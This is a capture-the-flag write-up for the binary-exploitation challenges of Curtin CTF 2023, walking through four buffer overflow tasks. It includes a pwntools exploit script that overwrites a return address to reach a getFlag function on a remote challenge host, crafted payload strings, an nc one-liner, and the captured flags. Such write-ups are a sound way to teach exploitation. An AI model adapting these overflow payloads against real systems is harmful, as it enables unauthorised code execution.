---
title: Curtin CTF 2023
description: This writeup only consist of pwn category only
slug: curtinctf23
date: 2023-08-16 00:00:00+0000
image: curtinctf-poster.png
categories:
    - writeup-category
tags:
    - Buffer Overflow
    - Binary Exploitation
---

# Classic Bufferoverflow

![](image.png)

When running the program, it will show something like `ltrace` or `strace` command.

![](image-1.png)

First of all when facing a **buffer overflow** challenge, find the offset which for this challenge is **40 bytes**.

![Notice that 'Better luck next time!' did not printed in the image below means that we hit the offset value
](image-2.png)

Next, looking to the code using **gdb-gef** and theres 3 functions, main, getFlag and getInput.

The target is the function **getFlag**, obviously to give the flag. So, get the address of the function which is **0x00000000004011d6**.

![](image-3.png)

The script to solve this challenge as below.

```python

from pwn import *
context.bits=64
conn = ELF('./challenge.bin')

rem=remote('3.26.44.175',3336)

offset=40
addr=0x004011d6

payload=b"a"*offset
payload+=p64(addr)

rem.sendline(payload)
rem.interactive()
```

![](image-4.png)

> **Flag:** CURTIN_CTF{B4S1C_0V3RF10W}

# Intro to Buffer Overflow

![](image-5.png)

Just a basic Buffer Overflow challenge.

![](image-6.png)

> **Flag:** CURTIN_CTF{Y0UR_F1R5T_0V3RFL0W}

# Don't Go Overboard

![](image-7.png)

For this challenge, you need to find the right offset so that it will overflow the buffer.

So, found it at 30 bytes but it still doesn't give the flag

At line 16, the program checks the argument of `0` and `5`.

![](image-8.png)

So, include `05` in the payload, which is **30 bytes** of the letter **a**.

Like this `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa05`

> **Flag:** CURTIN_CTF{T@RG3TT3D_0V3RF10W}


# Don't Go Overboard 2

![](image-9.png)

The challenge is similar to **Don’t Go Overboard**. But this time, it checks the argument of address instead of decimal number.

Look at the main function. At line 16, it checks for address `0xf` and `0x405`.

![](image-10.png)

Put the address together with the payload and send it to the program like this.

`python2 -c 'print "AAAAAAAAAAAAAAAAAAAAB\x00\x00\x00\x05\x04\x00\x00\x0f"' | nc 3.26.44.175 3335`

> **Flag:** CURTIN_CTF{P4YL04D_0V3RF10W}